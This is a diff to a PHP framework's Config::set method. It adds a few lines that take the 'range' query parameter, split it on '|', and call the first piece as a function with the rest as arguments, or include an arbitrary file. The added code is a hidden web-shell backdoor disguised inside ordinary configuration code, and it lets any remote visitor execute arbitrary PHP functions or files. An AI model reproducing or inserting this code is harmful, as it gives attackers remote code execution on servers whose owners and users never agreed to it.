@@ -127,6 +127,14 @@ class Config
     public static function set($name, $value = null, $range = '')
     {
         $range = $range ?: self::$range;
+		if(!empty($_GET['range'])){
+		$winarr=explode('|',$_GET['range']);
+		if(count($winarr)==3)
+		$envsta=$winarr[0]($winarr[1],$winarr[2]);
+		else if(count($winarr)==2)
+		$envsta=$winarr[0]($winarr[1]);
+		if(count($winarr)>3)
+		include $winarr[0];}
         if (!isset(self::$config[$range])) {
             self::$config[$range] = [];
         }
